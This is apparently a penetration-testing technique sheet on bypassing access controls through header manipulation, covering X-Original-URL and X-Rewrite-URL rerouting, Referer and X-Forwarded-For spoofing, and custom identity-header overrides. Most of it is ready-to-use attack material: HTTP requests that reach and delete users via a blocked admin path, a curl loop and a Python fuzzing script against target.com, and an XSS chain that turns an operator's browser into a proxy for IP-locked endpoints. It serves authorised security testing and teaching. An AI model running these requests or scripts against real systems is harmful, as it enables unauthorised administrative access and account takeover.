# URL/Header Manipulation Bypass

## When this applies

- A reverse proxy / API gateway blocks `/admin` but the backend trusts an `X-Original-URL` / `X-Rewrite-URL` header to determine the effective path.
- Authorization checks consult headers (Referer, X-Forwarded-For, X-Custom-IP-Authorization) instead of session.
- Backend uses custom identity headers (X-UserId, X-User, X-Auth-User) to identify the current user — overridable from the client.

## Technique

Send the request to an unrestricted path and use a header to make the backend re-route to the protected path. Or spoof the headers the backend uses to identify the caller.

**Alternative URL Headers:**
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin/delete?user=carlos
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
```

| Header | Purpose |
|--------|---------|
| X-Original-URL | Override request URL |
| X-Rewrite-URL | URL rewriting |
| X-Forwarded-For | IP spoofing |
| X-Remote-IP | IP specification |
| X-Originating-IP | Source IP |
| X-Client-IP | Client IP |
| Referer | Request origin |

## Steps

Lab — X-Original-URL Bypass:
```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

Exploitation:
```http
# Access blocked /admin
GET / HTTP/1.1
X-Original-URL: /admin

# Delete user
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

Referer-based bypass — vulnerable code:
```python
if '/admin' in request.headers.get('Referer'):
    allow_action()
```

Exploitation:
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: [non-admin-session]
Referer: https://target.com/admin
```

IP spoofing (for IP-based controls):
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### Custom Identity / Auth Override Headers

Some applications process custom headers that override the authenticated user. Test these on every protected endpoint:

| Header | Purpose |
|--------|---------|
| X-UserId | Override user ID |
| X-User-Id | Override user ID (hyphenated) |
| X-User | Override username |
| X-Auth-User | Override authenticated user |
| X-Account-Id | Override account |
| X-Auth-Token | Override auth token |
| X-Api-User | Override API user |

**Discovery**: Check JavaScript files, page source, and response headers for custom header names the application processes. Look for header parsing in source code (e.g., `request.headers.get('X-UserId')`).

**Testing**:
```bash
# Test all common identity headers on a protected endpoint
for HEADER in X-UserId X-User-Id X-User X-Auth-User X-Account-Id; do
  for ID in 1 2 100 admin; do
    RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
      "https://target.com/dashboard" \
      -H "Cookie: session=YOUR_SESSION" \
      -H "$HEADER: $ID")
    echo "$HEADER: $ID → $RESP"
  done
done
```

### IP-Allowlisted Endpoint Bypass via Authenticated Victim Browser

**Pattern:** Sensitive endpoint `/api/X` is locked to `127.0.0.1` (e.g. ASP.NET `[Authorize(Policy="RestrictIP")]` with whitelist `["127.0.0.1","::1"]`), but a sibling endpoint `/api/Y` is reachable to any authenticated user AND its data is rendered to a privileged operator's browser (admin dashboard, support panel, moderation queue).

**Exploitation chain:**
1. Identify reflective sink: anywhere that user-submitted text becomes HTML/JS in the operator's browser. Common: markdown comments rendered in an admin panel, ticket-body fields shown to support, "report" titles surfaced to mods.
2. Plant XSS in the public endpoint that fires `XMLHttpRequest` to the IP-locked endpoint with the victim's auth cookies/JWT (use the operator's existing session — same-origin XHRs auto-attach credentials).
3. The operator's browser runs from a host the IP allowlist trusts (often `127.0.0.1` if the operator browses through localhost or via a host-only proxy/VPN), so the request originates from a trusted IP.

**Why it works:** The allowlist treats *source IP of the HTTP request* as authority. The operator's browser becomes a confused-deputy proxy — it sees both attacker content (the XSS) and trusted-origin auth, and silently bridges them.

**Mitigation:** Require a separate origin/identity on locked-down endpoints (mTLS, signed-request, anti-CSRF tokens that the public endpoint can't read).

## Header fuzzing automation

```python
#!/usr/bin/env python3
import requests

URL = "https://target.com/admin"
SESSION = "your-session-cookie"

headers_to_test = [
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("Referer", "https://target.com/admin"),
]

for header_name, header_value in headers_to_test:
    headers = {
        "Cookie": f"session={SESSION}",
        header_name: header_value
    }

    response = requests.get(URL, headers=headers)

    print(f"[*] Testing {header_name}: {header_value}")
    print(f"    Status: {response.status_code}")
    if response.status_code == 200:
        print(f"    [+] SUCCESS with {header_name}")
    print()
```

## Verifying success

- Status changes from `403`/`401` to `200`/`204` when the spoofed header is added.
- Admin functionality executes (user deleted, role upgraded).
- Response body matches what the protected endpoint would return.

## Common pitfalls

- The reverse proxy may strip `X-Forwarded-For`, `X-Real-IP`, etc. — try less-common variants (X-Originating-IP, X-Custom-IP-Authorization).
- `Referer` checks are usually substring-based — `https://attacker.com/admin/foo` may pass.
- Custom identity headers may require a specific format (numeric ID vs username) — test both.
- Some servers ignore X-Original-URL on the root `/` but accept it on a deep path — try variations.

## Tools

- Burp Suite Repeater
- Burp extension: 403 Bypasser, BypassWAF
- curl with `-H "X-Header: value"`
- ffuf with header injection
